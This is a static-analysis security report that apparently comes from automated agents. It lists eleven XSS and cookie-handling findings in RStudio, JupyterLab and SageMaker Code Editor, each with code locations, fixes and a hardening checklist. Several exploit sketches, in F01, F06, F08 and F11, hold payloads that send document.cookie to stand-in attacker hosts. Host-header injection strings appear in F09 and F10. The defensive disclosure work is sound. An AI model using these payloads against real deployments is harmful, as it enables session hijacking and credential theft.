# Cookie-to-XSS Static Analysis Report

**Date:** 2026-03-01
**Scope:** Authorized static analysis (repo-only, no live exploitation)
**Repos analyzed:**
1. [rstudio/rstudio](https://github.com/rstudio/rstudio)
2. [jupyterlab/jupyterlab](https://github.com/jupyterlab/jupyterlab)
3. [aws/sagemaker-code-editor](https://github.com/aws/sagemaker-code-editor)

**Methodology:** 30+ parallel analysis agents covering C++/Java/TypeScript/JavaScript/Python across all three codebases. Each agent searched for cookie sources, DOM/server-side sinks, sanitization utilities, and dataflow between them.

---

## Executive Summary

| Repo | Cookie Attack Surface | Top Risk | Findings |
|------|----------------------|----------|----------|
| **rstudio/rstudio** | LOCALE cookie (JS-accessible), signed auth cookies (HttpOnly), appUri query param | LOCALE cookie → DOM XSS via `executeJavaScript` and `document.write` in ChatPane iframe | 6 findings |
| **jupyterlab/jupyterlab** | `_xsrf` cookie (JS-accessible for CSRF header) | Hash concatenation in href (DOM XSS); `new Function()` in i18n pluralForms (needs MITM) | 2 findings |
| **sagemaker-code-editor** | `vscode-tkn`, `authMode`, `expiryTime`, `studioUserProfileName`, `redirectURL`, `vscode-secret-key-path` (all JS-accessible, missing HttpOnly) | Incomplete HTML escaping in `asJSON()` + host header injection → reflected XSS | 3 findings |

**Total credible vulnerability candidates: 11**

---

## Findings

---

### [F01] rstudio | DOM-XSS | Severity: HIGH | Confidence: HIGH

**LOCALE Cookie Injection via Electron `executeJavaScript`**

- **Cookie name:** `LOCALE`
- **Source:** `cookie.value` read in Electron `session.cookies` event handler
  - `src/node/desktop/src/main/utils.ts:509`
- **Transform chain:** Cookie value → string template interpolation (no escaping) → `executeJavaScript()`
- **Sink:** `window.webContents.executeJavaScript(jsSetLocaleScript)` at `utils.ts:516`
- **Exact code refs:**
  - `/src/node/desktop/src/main/utils.ts:502-541` (handleLocaleCookies)
  - `/src/node/desktop/src/main/utils.ts:509` (cookie.value read)
  - `/src/node/desktop/src/main/utils.ts:511-514` (template literal injection)
  - `/src/node/desktop/src/main/utils.ts:516` (executeJavaScript sink)
- **Why vulnerable:** The `newLanguage` variable from `cookie.value` is interpolated directly into a JavaScript string via template literal without any escaping. The string is then executed via `executeJavaScript()` in the renderer process.
  ```typescript
  const jsSetLocaleScript = `
    window.localStorage.setItem('${localeCookieName}', '${newLanguage}');
  `;
  await window.webContents.executeJavaScript(jsSetLocaleScript);
  ```
- **Exploit sketch:**
  ```
  Set-Cookie: LOCALE=en');fetch('https://attacker.com/?d='+document.cookie);//
  ```
  This breaks out of the JS string literal and executes arbitrary code.
- **How attacker sets cookie:** MITM on HTTP connection, subdomain cookie injection, or JS on a sibling subdomain.
- **Impact:** Arbitrary JavaScript execution in Electron renderer with access to localStorage, sessionStorage, and application state.
- **Fix guidance:** Use `JSON.stringify(newLanguage)` for escaping, and validate against an allowlist of known locales (`en`, `fr`).
- **Notes:** The Electron shell has `contextIsolation: true` and `sandbox: true`, which limits escalation from renderer to main process. Still, renderer-context XSS can steal IDE content.

---

### [F02] rstudio | DOM-XSS | Severity: HIGH | Confidence: HIGH

**LOCALE Cookie Injection via ChatPane `document.write` in iframe**

- **Cookie name:** `LOCALE`
- **Source:** `Cookies.getCookie("LOCALE")` at `LocaleCookie.java:34`
- **Transform chain:** Cookie value → `getUiLanguage()` (no validation) → `StringBuilder.append()` → HTML string → `document.write(html)` in iframe
- **Sink:** `document.write(html)` via JSNI in `ChatPane.java:250-259`
- **Exact code refs:**
  - `/src/gwt/src/org/rstudio/studio/client/workbench/prefs/model/LocaleCookie.java:34` (cookie read)
  - `/src/gwt/src/org/rstudio/studio/client/workbench/views/chat/ChatPane.java:205` (HTML concatenation)
  - `/src/gwt/src/org/rstudio/studio/client/workbench/views/chat/ChatPane.java:250-259` (document.write sink)
  - Same pattern at lines 591, 694, 792, 985 of ChatPane.java
- **Why vulnerable:** The LOCALE cookie value is concatenated directly into an `<html lang='...'>` attribute inside an HTML string that is written to an iframe via `document.write()`. No escaping or validation is applied.
  ```java
  html.append("<html lang='");
  html.append(LocaleCookie.getUiLanguage()); // raw cookie value
  html.append("'>");
  ```
- **Exploit sketch:**
  ```
  LOCALE=en'><img src=x onerror=alert(document.cookie)><html lang='
  ```
- **How attacker sets cookie:** Same as F01. The `LOCALE` cookie has no HttpOnly flag.
- **Impact:** XSS within the ChatPane iframe. Five separate injection points in ChatPane.java.
- **Fix guidance:** Validate `getUiLanguage()` against the allowlist `{"en", "fr"}`. Use `SafeHtmlUtils.htmlEscapeAllowEntities()` on the value before HTML concatenation.

---

### [F03] rstudio | Reflected XSS (via redirect) | Severity: HIGH | Confidence: MEDIUM

**`appUri` Redirect Without Scheme Validation**

- **Cookie name(s):** N/A (query parameter, but flows through cookie-adjacent auth paths)
- **Source:** `request.queryParamValue(kAppUri)` at `ServerAuthCommon.cpp:103`
- **Transform chain:** Query param → check if starts with `/` (else prepend `./`) → `pResponse->setMovedTemporarily(request, appUri)` (HTTP Location header)
- **Sink:** HTTP 302 Location header at `ServerAuthCommon.cpp:110` and `doSignIn()` at line 244
- **Exact code refs:**
  - `/src/cpp/server/auth/ServerAuthCommon.cpp:103-110` (initial redirect)
  - `/src/cpp/server/auth/ServerAuthCommon.cpp:219-245` (doSignIn redirect)
  - `/src/cpp/server/auth/ServerAuthCommon.cpp:248-288` (signOut redirect)
- **Why vulnerable:** The validation only checks if the URI starts with `/`. It does not block `javascript:`, `data:`, or `vbscript:` URI schemes. Some browsers follow `javascript:` URIs in Location headers.
  ```cpp
  if (appUri.empty() || appUri[0] != '/')
     appUri = "/" + appUri;
  pResponse->setMovedTemporarily(request, appUri);
  ```
- **Exploit sketch:**
  ```
  /auth-sign-in?appUri=javascript:alert(document.cookie)
  ```
  After prepending `/`, becomes `/javascript:alert(document.cookie)` which is a relative path (safe). But the form-submitted `appUri` from `doSignIn` may bypass differently.
- **Prerequisites:** Needs runtime confirmation on exact browser handling of Location header with crafted URI. The prepended `/` may neutralize the `javascript:` scheme in most cases.
- **Impact:** Potential open redirect leading to XSS if scheme validation is bypassed.
- **Fix guidance:** Explicitly validate `appUri` against an allowlist of schemes (`http://`, `https://`, or relative paths only). Reject any URI containing `:` before the first `/`.
- **Notes:** Needs runtime confirmation. The `/` prepend is a partial mitigation but not comprehensive.

---

### [F04] rstudio | Reflected XSS | Severity: MEDIUM | Confidence: HIGH

**DialogHtmlSanitizer Bypass via Event Handlers**

- **Cookie name(s):** N/A (server API → dialog content, but attacker-controlled content passes through)
- **Source:** User-supplied HTML passed to RStudio API dialog messages
- **Transform chain:** HTML string → `DialogHtmlSanitizer.sanitizeHtml()` → `SafeHtmlUtils.fromTrustedString()` → rendered in dialog
- **Sink:** Dialog message display
- **Exact code refs:**
  - `/src/gwt/src/org/rstudio/studio/client/common/rstudioapi/DialogHtmlSanitizer.java:71` (== vs .equals() bug)
  - `/src/gwt/src/org/rstudio/studio/client/common/rstudioapi/DialogHtmlSanitizer.java:73` (incomplete regex)
  - `/src/gwt/src/org/rstudio/studio/client/common/rstudioapi/RStudioAPI.java:88` (usage)
- **Why vulnerable:**
  1. Line 71 uses Java `==` instead of `.equals()` for string comparison, so the `"a"` tag special handling never fires.
  2. Even if fixed, the regex at line 73 only validates `href` attribute — event handlers like `onclick` pass through unchecked.
  ```java
  if (tagName == "a") {  // BUG: should be .equals()
    if (tag.matches("a href ?= ?\"https?://[^\"]+\"")) {
  ```
- **Exploit sketch:**
  ```html
  <a href="http://x.com" onclick="alert(document.cookie)">click</a>
  ```
  The `onclick` handler passes through because the `"a"` tag branch is never reached.
- **Impact:** XSS in dialog context when RStudio API displays HTML messages.
- **Fix guidance:** Use `.equals()` for string comparison. Strip all attributes except `href` from anchor tags. Consider replacing custom sanitizer with a well-tested library.

---

### [F05] rstudio | Reflected XSS | Severity: MEDIUM | Confidence: HIGH

**Wrong Escape Context in SessionTutorial onclick Handler**

- **Cookie name(s):** N/A (tutorial name from server, but user-influenced)
- **Source:** `tutorial.name` and `pkgName` from session data
- **Transform chain:** Values → `htmlEscape(value, true)` (HTML attribute escaping) → inserted into JavaScript `onclick` attribute context
- **Sink:** `onclick="window.parent.tutorialRun('ESCAPED_VALUE')"` in HTML
- **Exact code refs:**
  - `/src/cpp/session/modules/SessionTutorial.cpp:275` (htmlEscape in JS context)
- **Why vulnerable:** `htmlEscape()` is designed for HTML attribute context, not JavaScript string context. Entity-encoded characters (`&#x27;`) are not valid JavaScript escapes. In an `onclick` attribute, the browser first decodes HTML entities, then executes JavaScript — so `&#x27;` becomes `'` in the JS context, allowing string breakout.
  ```cpp
  << " onclick=\"window.parent.tutorialRun('"
  << htmlEscape(tutorial.name, true)  // WRONG: should be jsLiteralEscape
  << "', '" << htmlEscape(pkgName, true) << "')\""
  ```
- **Exploit sketch:** If `tutorial.name` contains `'); alert('xss`:
  - `htmlEscape` produces `&#x27;); alert(&#x27;xss`
  - Browser decodes entities: `'); alert('xss`
  - JS executes: `tutorialRun(''); alert('xss', '...')`
- **Impact:** XSS in tutorial listing if tutorial names contain attacker-controlled content.
- **Fix guidance:** Use `jsLiteralEscape()` instead of `htmlEscape()` for values inside `onclick` JavaScript strings. Better yet, use `addEventListener` instead of inline handlers.

---

### [F06] rstudio | Stored XSS | Severity: MEDIUM | Confidence: MEDIUM

**Raw HTML Injection via loginPageHtml Configuration**

- **Cookie name(s):** N/A (configuration file, not cookie-sourced)
- **Source:** `server::options().authLoginPageHtml()` — reads from `/etc/rstudio/login.html`
- **Transform chain:** File contents → stored in memory → `#!loginPageHtml#` raw template insertion (no escaping)
- **Sink:** Login page HTML response at `encrypted-sign-in.htm:175`
- **Exact code refs:**
  - `/src/cpp/server/ServerLoginPages.cpp:90` (config read)
  - `/src/gwt/www/templates/encrypted-sign-in.htm:175` (`#!loginPageHtml#` raw insertion)
- **Why vulnerable:** The `#!` prefix in the template system explicitly bypasses HTML escaping. If an attacker can write to `/etc/rstudio/login.html`, arbitrary JavaScript executes for every user visiting the login page.
- **Exploit sketch:** Write `<script>fetch('https://attacker.com/?c='+document.cookie)</script>` to login.html.
- **Prerequisites:** Requires write access to server config file (local privilege escalation or misconfigured permissions).
- **Impact:** Stored XSS on the login page, affecting all users.
- **Fix guidance:** Sanitize the login page HTML (strip `<script>`, event handlers, `<iframe>`). Add CSP headers. Document security requirements for file permissions.
- **Notes:** Default login.html is empty, so this is safe in default config.

---

### [F07] jupyterlab | DOM-XSS | Severity: HIGH | Confidence: MEDIUM

**Hash Concatenation in Anchor href (DOM XSS in Rendered Markdown)**

- **Cookie name(s):** N/A (DOM-based, via URL hash in rendered content)
- **Source:** `anchor.hash` property from rendered HTML anchor elements
- **Transform chain:** Anchor hash → concatenated to resolved URL → assigned to `anchor.href`
- **Sink:** `anchor.href = url + hash` at `renderers.ts:1431`
- **Exact code refs:**
  - `/packages/rendermime/src/renderers.ts:1387` (hash extraction)
  - `/packages/rendermime/src/renderers.ts:1431` (href assignment with concatenation)
- **Why vulnerable:** The `anchor.hash` is directly concatenated to a resolved URL and assigned back to `anchor.href`. If a crafted anchor in rendered markdown has a hash containing dangerous content, it flows unsanitized to the href.
- **Exploit sketch:**
  ```markdown
  [Click](http://example.com#"><img src=x onerror=alert(1)>)
  ```
- **Prerequisites:** Attacker must be able to provide markdown content rendered in a notebook (e.g., a shared notebook). Needs runtime confirmation of whether the sanitizer strips the crafted hash before this code runs.
- **Impact:** XSS in notebook rendering context.
- **Fix guidance:** Sanitize `hash` before concatenation. Use `new URL(url)` and set `.hash` separately, or `encodeURIComponent(hash)`.
- **Notes:** Needs runtime confirmation — the sanitizer may strip this before `renderers.ts` processes it.

---

### [F08] jupyterlab | Code Injection | Severity: MEDIUM | Confidence: MEDIUM

**`new Function()` in i18n pluralForms Processing**

- **Cookie name(s):** N/A (locale from settings, pluralForms from server response)
- **Source:** `pluralForm` string from server translation API response
- **Transform chain:** Settings locale → API request `/api/translations/{locale}` → response `pluralForms` string → regex validation → `new Function()` constructor
- **Sink:** `new Function('n', 'let plural, nplurals; ' + pluralForm + ...)` at `gettext.ts:560-565`
- **Exact code refs:**
  - `/packages/translation-extension/src/index.ts:63` (locale from settings)
  - `/packages/translation/src/server.ts:31` (API request)
  - `/packages/translation/src/gettext.ts:543-566` (getPluralFunc with new Function)
- **Why vulnerable:** The regex at line 547-549 validates structure but allows `()` characters in the character class, enabling function call syntax. The `new Function()` constructor is equivalent to `eval()`.
  ```typescript
  let pf_re = new RegExp(
    '^\\s*nplurals\\s*=\\s*[0-9]+\\s*;\\s*plural\\s*=\\s*(?:\\s|[-\\?\\|&=!<>+*/%:;n0-9_()])+'
  );
  return new Function('n', 'let plural, nplurals; ' + pluralForm + ...);
  ```
- **Exploit sketch:**
  ```json
  {"": {"pluralForms": "nplurals=2; plural=(fetch('https://attacker.com/?c='+document.cookie)),n>1"}}
  ```
- **Prerequisites:** Attacker must control or MITM the translations API server. The code comments acknowledge this risk ("hidden eval() equivalent"). The regex provides partial mitigation — alphabetic characters beyond `n` are blocked, limiting many payloads.
- **Impact:** Arbitrary code execution in the JupyterLab frontend context.
- **Fix guidance:** Replace `new Function()` with a safe expression parser (e.g., `jsep`). The code's own TODO comment suggests this approach.
- **Notes:** Needs runtime confirmation. The regex blocks alphabetic chars (only `n` allowed), which limits practical exploitation. But numeric-only payloads or chaining with `(` and `)` may still be viable.

---

### [F09] sagemaker-code-editor | Reflected XSS | Severity: HIGH | Confidence: HIGH

**Incomplete HTML Escaping in `asJSON()` Enables Host Header XSS**

- **Cookie name(s):** N/A (host header injection, but cookie flags relevant — see F11)
- **Source:** `x-original-host` / `x-forwarded-host` / `req.headers.host` at `webClientServer.ts:286-290`
- **Transform chain:** Host header → `remoteAuthority` variable → `workbenchWebConfiguration` object → `asJSON()` (only escapes `"` to `&quot;`) → `{{WORKBENCH_WEB_CONFIGURATION}}` template substitution → HTML `data-settings` attribute
- **Sink:** `<meta id="vscode-workbench-web-configuration" data-settings="{{WORKBENCH_WEB_CONFIGURATION}}">` in workbench.html
- **Exact code refs:**
  - `/patched-vscode/src/vs/server/node/webClientServer.ts:286-290` (host header read)
  - `/patched-vscode/src/vs/server/node/webClientServer.ts:295-296` (asJSON — incomplete escaping)
  - `/patched-vscode/src/vs/server/node/webClientServer.ts:359-365` (template value assignment)
  - `/patched-vscode/src/vs/server/node/webClientServer.ts:380` (template substitution)
  - `/patched-vscode/src/vs/code/browser/workbench/workbench.html:20` (HTML sink)
- **Why vulnerable:** The `asJSON()` function only escapes double quotes:
  ```typescript
  function asJSON(value: unknown): string {
    return JSON.stringify(value).replace(/"/g, '&quot;');
  }
  ```
  It does NOT escape `<`, `>`, `&`, or `'`. A crafted host header containing `>` can break out of the `data-settings` attribute into arbitrary HTML.
- **Exploit sketch:**
  ```
  GET / HTTP/1.1
  Host: x"><script>alert(document.cookie)</script><meta x="
  ```
  After `asJSON()` the `"` becomes `&quot;` but `<script>` passes through unescaped.
- **Prerequisites:** Attacker must control the `Host`, `X-Forwarded-Host`, or `X-Original-Host` header. In reverse-proxy deployments this may be feasible.
- **Impact:** Full XSS in the SageMaker Code Editor web UI. Can steal session tokens, execute arbitrary code.
- **Fix guidance:** Escape all HTML-significant characters in `asJSON()`: `<` → `\u003c`, `>` → `\u003e`, `&` → `\u0026`. Or use a proper HTML escaping library.

---

### [F10] sagemaker-code-editor | Reflected XSS | Severity: MEDIUM | Confidence: HIGH

**Host Header Injection into CSP Directive**

- **Cookie name(s):** N/A
- **Source:** Same `remoteAuthority` from host headers at `webClientServer.ts:286-290`
- **Transform chain:** Host header → `remoteAuthority` → embedded unescaped in `script-src` CSP directive
- **Sink:** `Content-Security-Policy` response header at `webClientServer.ts:392`
- **Exact code refs:**
  - `/patched-vscode/src/vs/server/node/webClientServer.ts:286-290` (source)
  - `/patched-vscode/src/vs/server/node/webClientServer.ts:392` (CSP sink)
- **Why vulnerable:**
  ```typescript
  `script-src 'self' 'unsafe-eval' ... http://${remoteAuthority};`
  ```
  A crafted host like `attacker.com 'unsafe-inline'` would inject `'unsafe-inline'` into the CSP, weakening it to allow inline script execution.
- **Exploit sketch:**
  ```
  Host: attacker.com 'unsafe-inline'
  ```
  CSP becomes: `script-src 'self' 'unsafe-eval' ... http://attacker.com 'unsafe-inline';`
- **Prerequisites:** Same as F09 — control of Host/X-Forwarded-Host header.
- **Impact:** CSP bypass, enabling exploitation of other XSS vectors that would otherwise be blocked.
- **Fix guidance:** Validate `remoteAuthority` against an allowlist or sanitize to only contain valid hostname characters.

---

### [F11] sagemaker-code-editor | Cookie Misconfiguration | Severity: HIGH | Confidence: HIGH

**Missing HttpOnly and Secure Flags on Authentication Cookies**

- **Cookie name(s):** `vscode-tkn` (connection token), plus `authMode`, `expiryTime`, `studioUserProfileName`, `ssoExpiryTimestamp`, `redirectURL`, `vscode-secret-key-path`
- **Source:** Cookie set at `webClientServer.ts:258-265`
  ```typescript
  cookie.serialize(connectionTokenCookieName, queryConnectionToken, {
    sameSite: 'lax',
    maxAge: 60 * 60 * 24 * 7
    // Missing: httpOnly, secure, path
  });
  ```
- **Transform chain:** Cookie accessible via `document.cookie` → read by `getCookieValue()` at `dom.ts:2143-2147` and `client.ts:57-60`
- **Sink:** Cookie values exposed to JS and exported via VS Code command `sagemaker.parseCookies` at `client.ts:29-36`
- **Exact code refs:**
  - `/patched-vscode/src/vs/server/node/webClientServer.ts:258-265` (cookie set without HttpOnly/Secure)
  - `/patched-vscode/src/vs/server/node/webClientServer.ts:410-417` (same pattern)
  - `/patched-vscode/src/vs/base/browser/dom.ts:2143-2147` (getCookieValue DOM read)
  - `/patched-vscode/src/vs/workbench/browser/client.ts:21-25` (sensitive cookie reads)
  - `/patched-vscode/src/vs/workbench/browser/client.ts:29-36` (command exposing cookie values)
- **Why vulnerable:** Without HttpOnly, any XSS vulnerability (including F09) can steal the `vscode-tkn` authentication token. Without Secure, MITM attackers can intercept or inject the token over HTTP.
- **Exploit sketch:** Combined with F09:
  ```
  Host: x"><script>fetch('https://evil.com/?t='+document.cookie)</script><meta x="
  ```
  Steals all cookies including the connection token.
- **Impact:** Session hijacking, authentication bypass, credential theft.
- **Fix guidance:** Add `httpOnly: true, secure: true, path: '/'` to all `cookie.serialize()` calls. For cookies that must be read by JS (e.g., `authMode`), use separate non-sensitive cookies.

---

## Non-Issues / Safe Patterns Observed

### RStudio
- **Signed auth cookies:** All auth cookies (`user-id`, `rs-csrf-token`, `persist-auth`, `user-list-id`) are HMAC-SHA256 signed with HttpOnly, Secure, and SameSite flags properly configured. (`SecureCookie.cpp:106-151`)
- **Template system default escaping:** The `#variable#` syntax HTML-escapes by default. Only `#!variable#` bypasses escaping. (`TemplateFilter.hpp:44-73`)
- **JSON output:** Uses RapidJSON with automatic string escaping. Cookie values never directly concatenated into JSON responses.
- **appUri in form:** The `appUri` parameter in the login form is properly HTML-escaped via default template syntax `#appUri#`.
- **Electron security:** `contextIsolation: true`, `nodeIntegration: false`, `sandbox: true` properly configured in `desktop-browser-window.ts:148-160`.
- **CSRF protection:** Proper UUID-based CSRF tokens with HttpOnly cookies and form validation.

### JupyterLab
- **Cookie isolation from DOM:** The `_xsrf` cookie is only used for HTTP headers (`X-XSRFToken`) and URL query params — never written to DOM sinks.
- **Sanitizer for untrusted content:** `sanitize-html` library applied to all untrusted notebook output before `innerHTML` assignment. (`renderers.ts:46-48`)
- **Trust model:** Explicit `trusted` flag gates script execution. Untrusted content is sanitized. (`renderers.ts:44-59`)
- **CSS expression blocking:** Sanitizer explicitly strips CSS `expression()` and `javascript:` in URLs. (Tested in `sanitizer.spec.ts:277-281`)
- **Extension loading:** Plugin activation is static/configuration-driven — no cookie influence on which extensions load.
- **CSS.escape():** Properly used in querySelector calls to prevent selector injection. (`notebook/src/widget.ts:2796`)

### SageMaker Code Editor
- **Trusted Types:** `ttPolicy.createHTML()` used for most innerHTML assignments in notebook renderers and linkify. (`notebook-renderers/src/index.ts:112,142`)
- **DOMPurify:** Applied to innerHTML in `dom.ts:1952` for general DOM insertion.
- **Markdown sanitization:** DOMPurify applied to markdown rendering in untrusted workspaces. (`markdown-language-features/notebook/index.ts:339`)

---

## Hardening Checklist

### Cookie Security
- [ ] **HttpOnly:** Set on all cookies containing auth tokens or sensitive data
- [ ] **Secure:** Set on all cookies when HTTPS is available
- [ ] **SameSite=Strict:** Use where possible (Lax minimum)
- [ ] **Path:** Restrict to minimum required path
- [ ] **Domain:** Do not set (use host-only cookies) unless subdomain sharing is required
- [ ] **Signing:** HMAC-sign cookie values to prevent tampering
- [ ] **Allowlist validation:** Validate cookie values against expected formats before use

### XSS Prevention
- [ ] **Context-aware escaping:** Use the correct escaping function for each output context (HTML body, HTML attribute, JavaScript string, URL, CSS)
- [ ] **Content Security Policy:** Implement strict CSP (`script-src 'self'`; avoid `'unsafe-inline'` and `'unsafe-eval'`)
- [ ] **Trusted Types:** Enforce Trusted Types to prevent DOM XSS
- [ ] **Sanitizer library:** Use well-tested sanitizers (DOMPurify, sanitize-html) instead of custom implementations
- [ ] **No `eval()`/`new Function()`:** Avoid dynamic code execution with untrusted input
- [ ] **Host header validation:** Validate `Host`/`X-Forwarded-Host` against an allowlist

### Redirect Security
- [ ] **Scheme validation:** Only allow `http://` and `https://` schemes in redirect targets
- [ ] **Domain validation:** Restrict redirects to same-origin or allowlisted domains
- [ ] **Relative path enforcement:** For same-site redirects, enforce that paths are relative

---

## Coverage Summary

### Agents Deployed: 30+

**RStudio (10 agents):**
| Agent | Focus | Key Result |
|-------|-------|------------|
| A1 | C++ cookie parsing | Safe — HMAC-signed, proper parsing |
| A2 | Server-side templates | loginPageHtml raw injection (F06) |
| A3 | JS/TS frontend DOM sinks | LOCALE → ChatPane document.write (F02) |
| A4 | Electron/desktop shell | LOCALE → executeJavaScript (F01) |
| A5 | Auth/session middleware | Properly configured flags (safe) |
| A6 | URL construction/redirects | appUri redirect without scheme validation (F03) |
| A7 | Sanitization utilities | DialogHtmlSanitizer bypass (F04), wrong escape context (F05) |
| A8 | Legacy code paths | GWT SafeHtml patterns generally safe |
| A9 | Build pipeline | No cookie-related build issues |
| A10 | Cookie-to-JSON config | Confirmed F06, F03; safe CSRF handling |

**JupyterLab (10 agents):**
| Agent | Focus | Key Result |
|-------|-------|------------|
| B1 | Frontend DOM sinks | No direct cookie→DOM flows |
| B2 | Extension/plugin loading | No cookie control over plugins |
| B3 | Server/token bridges | Token in page HTML, XSRF in URLs (info disclosure) |
| B4 | URL/router/state | Hash concatenation in href (F07) |
| B5 | CSP/sanitizer | sanitize-html properly configured |
| B6 | Markdown/renderer | Sanitizer config weakness; trusted content bypass (by design) |
| B7 | Settings storage | No cookie→settings→DOM flow |
| B8 | i18n/template | new Function() in pluralForms (F08) |
| B9 | WebSocket/REST | Cookie used in headers only (safe) |
| B10 | Security mitigations | Trust model, CSP, sanitizer all present |

**SageMaker Code Editor (10 agents):**
| Agent | Focus | Key Result |
|-------|-------|------------|
| C1 | Server/API cookies | cookie npm package usage identified |
| C2 | Frontend DOM sinks | Cookie data exposed via command; DOM sinks protected |
| C3 | Auth flows | Logout redirect from URL (safe) |
| C4 | Workspace/file UI | No cookie→UI rendering |
| C5 | Third-party deps | Incomplete asJSON() escaping (F09); host header XSS |
| C6 | CSP/sanitizer | CSP injection via host header (F10) |
| C7 | Build artifacts | Template substitution identified |
| C8 | Embedded components | Webview security patterns reviewed |
| C9 | Middleware | No cookie→header→render flows |
| C10 | Cookie security flags | Missing HttpOnly/Secure (F11) |

---

*Report generated by automated static analysis. All findings are based on source code review only. Runtime confirmation is recommended for findings marked as "needs runtime confirmation."*
